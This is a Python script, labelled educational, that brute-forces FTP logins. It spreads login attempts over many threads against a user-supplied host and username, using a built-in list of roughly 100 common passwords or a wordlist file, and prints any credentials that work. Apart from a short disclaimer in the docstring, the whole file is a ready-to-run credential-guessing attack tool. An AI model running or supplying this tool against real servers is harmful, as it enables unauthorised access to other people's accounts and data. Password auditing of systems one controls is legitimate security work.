"""
FTP Password Brute-Force Script (Educational Use Only)

This script demonstrates a multithreaded FTP password checking tool using Python.
It is intended **only for educational purposes** or testing FTP servers you own.

Features:
- Multithreaded password attempts using ThreadPoolExecutor
- Accepts a file-based wordlist or defaults to a built-in top 100 passwords list
- Customizable host, username, port, and number of threads
- Friendly terminal output with colored messages
"""

import ftplib
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore
import argparse
import os
from threading import Event

init(autoreset=True)

found = Event()

default_passwords = [
    "123456", "password", "123456789", "12345678", "12345", "111111",
    "1234567", "sunshine", "qwerty", "iloveyou", "princess", "admin",
    "welcome", "666666", "abc123", "football", "123123", "monkey",
    "654321", "!@#$%^&*", "charlie", "aa123456", "donald", "password1",
    "qwerty123", "letmein", "dragon", "baseball", "superman", "696969",
    "shadow", "master", "michael", "6969", "qazwsx", "1234", "password123",
    "123", "123321", "987654321", "1q2w3e4r", "qwertyuiop", "123qwe",
    "killer", "trustno1", "123456a", "asdfghjkl", "123abc", "hottie",
    "loveme", "zaq1zaq1", "password1!", "121212", "000000", "qwerty1",
    "555555", "password!", "1qaz2wsx", "football1", "1234567890", "superman1",
    "pokemon", "abc123456", "1q2w3e4r5t", "qwerty12", "qwerty12345", "zaq12wsx",
    "12345a", "1234qwer", "123abc123", "1q2w3e", "qwe123", "asdf123", "11111111",
    "asdfgh", "123654", "66666666", "1qazxsw2", "123123123", "q1w2e3r4",
    "55555555", "1234561", "123456789a", "1q2w3e4r5t6y", "loveyou", "iloveyou1",
    "1qaz2wsx3edc", "asdfqwer", "superman123", "zaq12wsx34","qwerty!@#",
    "test1", "123qweasd", "qwe123456", "1q2w3e4r!", "1qaz2wsx!", "1234abcd",
    "abcd1234", "qweasdzxc", "qazwsxedc", "1q2w3e4r5t6", "123abc!", "qwerty@123",
    "password1234", "12345qwert", "abc1234", "qwertyui", "asdf1234", "admin123"
]

parser = argparse.ArgumentParser(
    description="FTP Password Checker (Educational Use Only)",

)
parser.add_argument('-H', '--host', required=True, help='Target FTP host (e.g., 192.168.1.10)')
parser.add_argument('-u', '--user', required=True, help='FTP username')
parser.add_argument('-p', '--password', help='Path to wordlist file (optional)')
parser.add_argument('-t', '--threads', type=int, default=30, help='Number of threads (default: 30)')
parser.add_argument('-port', type=int, default=21, help='FTP port (default: 21)')

args = parser.parse_args()
host = args.host
user = args.user
port = int(args.port)
max_threads = int(args.threads)
wordlist_path = args.password

if wordlist_path:
    if os.path.exists(wordlist_path):
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    else:
        print(f"[!] Wordlist file '{wordlist_path}' not found. Using default list.")
        passwords = default_passwords
else:
    print("[+] No wordlist provided. Using default built-in list.")
    passwords = default_passwords

print(f"[+] Passwords to try: {len(passwords)}")

def connect_ftp(password):
    if found.is_set():
        return
    print(f"[!] Trying: {password}")
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=5)
        ftp.login(user, password)
    except ftplib.error_perm:
        pass
    else:
        print(f"{Fore.GREEN}[+] Found credentials:")
        print(f"\tHost: {host}")
        print(f"\tUser: {user}")
        print(f"\tPassword: {password}")
        found.set()

try:
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        for pwd in passwords:
            if found.is_set():
                break
            executor.submit(connect_ftp, pwd)
except KeyboardInterrupt:
    print("\n[!] Interrupted by user")
